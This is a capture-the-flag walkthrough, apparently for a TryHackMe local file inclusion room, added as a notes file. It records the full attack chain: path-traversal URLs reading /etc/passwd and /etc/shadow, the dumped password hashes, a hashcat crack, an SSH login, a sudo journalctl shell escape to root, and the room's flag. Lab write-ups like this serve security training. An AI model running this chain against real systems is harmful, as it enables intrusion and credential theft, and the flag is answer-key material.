@@ -1,0 +1,58 @@
+https://tryhackme.com/room/lfi
+
+https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks
+
+
+http://10.10.3.185/home?page=../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash 
+.....
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
+pollinate:x:109:1::/var/cache/pollinate:/bin/false 
+falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash 
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
+
+http://10.10.3.185/home?page=../../../../etc/shadow
+
+
+root:$6$UVbVpBq4$O8f/Nk488RT95VcJpLl0WgwOuguU6kCRBVE3EHGHFviJJV9MNfb0GbK38WryIkx72d/DKh3HBprBYTcNJf0Xn0:18289:0:99999:7::: 
+daemon:*:17647:0:99999:7::: 
+bin:*:17647:0:99999:7::: 
+sys:*:17647:0:99999:7::: sync:*:17647:0:99999:7::: 
+games:*:17647:0:99999:7::: man:*:17647:0:99999:7::: 
+lp:*:17647:0:99999:7::: mail:*:17647:0:99999:7::: news:*:17647:0:99999:7::: 
+uucp:*:17647:0:99999:7::: proxy:*:17647:0:99999:7::: www-data:*:17647:0:99999:7::: 
+backup:*:17647:0:99999:7::: list:*:17647:0:99999:7::: irc:*:17647:0:99999:7::: gnats:*:17647:0:99999:7::: 
+nobody:*:17647:0:99999:7::: systemd-network:*:17647:0:99999:7::: systemd-resolve:*:17647:0:99999:7::: syslog:*:17647:0:99999:7::: 
+messagebus:*:17647:0:99999:7::: _apt:*:17647:0:99999:7::: 
+lxd:*:18289:0:99999:7::: uuidd:*:18289:0:99999:7::: dnsmasq:*:18289:0:99999:7::: landscape:*:18289:0:99999:7::: pollinate:*:18289:0:99999:7::: 
+falcon:$6$xQmTDVmT$hgSLG3ebs.8Tc/F4qqXNnvBBnG736EWpWKaprFVARjAsZ6JyoL4WaJdGv5.qddMWF4/MoJgN6Hekri8wyJ97k/:18289:0:99999:7::: 
+sshd:*:18289:0:99999:7::: 
+
+
+hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt
+
+$6$xQmTDVmT$hgSLG3ebs.8Tc/F4qqXNnvBBnG736EWpWKaprFVARjAsZ6JyoL4WaJdGv5.qddMWF4/MoJgN6Hekri8wyJ97k/:password09
+
+ssh falcon@10.10.3.185
+
+sudo -l
+Matching Defaults entries for falcon on walk:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User falcon may run the following commands on walk:
+    (root) NOPASSWD: /bin/journalctl
+
+
+search
+https://gtfobins.github.io/gtfobins/journalctl/
+https://github.com/mzfr/gtfo
+
+
+sudo journalctl
+!/bin/sh
+
+cat /root/root.txt
+H1EQRK5XEX140H2KMO08
+
